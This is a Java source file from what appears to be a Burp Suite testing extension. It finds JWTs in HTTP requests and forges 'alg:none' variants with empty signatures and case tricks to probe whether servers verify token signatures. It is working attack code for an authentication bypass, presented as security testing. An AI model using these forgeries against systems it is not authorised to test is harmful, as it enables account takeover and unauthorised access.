package com.victor.reconloop;

import burp.api.montoya.http.message.requests.HttpRequest;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Pure helpers for active JWT testing: find JWTs in a request and forge {@code alg:none} variants.
 * The forgeries are re-encoded tokens (header rewritten to alg:none, original payload, empty
 * signature) that a correctly-implemented server must reject; the controller replays them and
 * compares responses to decide whether signatures are actually verified. No network here.
 */
final class JwtAttackEngine {

    private static final Pattern JWT =
            Pattern.compile("eyJ[A-Za-z0-9_-]{5,}\\.[A-Za-z0-9_-]{5,}\\.[A-Za-z0-9_-]*");

    private static final Pattern ALG =
            Pattern.compile("(\"alg\"\\s*:\\s*\")([^\"]*)(\")");

    static Set<String> extractJwts(HttpRequest request) {
        LinkedHashSet<String> out = new LinkedHashSet<>();
        if (request == null) return out;
        Matcher m = JWT.matcher(request.toString());
        while (m.find()) {
            String token = m.group();
            if (token.split("\\.").length >= 2) out.add(token);
        }
        return out;
    }

    /** alg:none forgeries with an empty signature (case variants some libraries mishandle). */
    static List<String> forgeNoneVariants(String token) {
        List<String> out = new ArrayList<>();
        String[] parts = token.split("\\.");
        if (parts.length < 2) return out;
        String headerJson = decode(parts[0]);
        if (headerJson == null || !ALG.matcher(headerJson).find()) return out;
        for (String noneAlg : List.of("none", "None", "NONE", "nOnE")) {
            String rewritten = ALG.matcher(headerJson).replaceFirst("$1" + Matcher.quoteReplacement(noneAlg) + "$3");
            out.add(encode(rewritten) + "." + parts[1] + ".");
        }
        return out;
    }

    private static String decode(String segment) {
        try {
            return new String(Base64.getUrlDecoder().decode(pad(segment)), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static String encode(String value) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(value.getBytes(StandardCharsets.UTF_8));
    }

    private static String pad(String value) {
        int mod = value.length() % 4;
        return mod == 0 ? value : value + "====".substring(mod);
    }
}
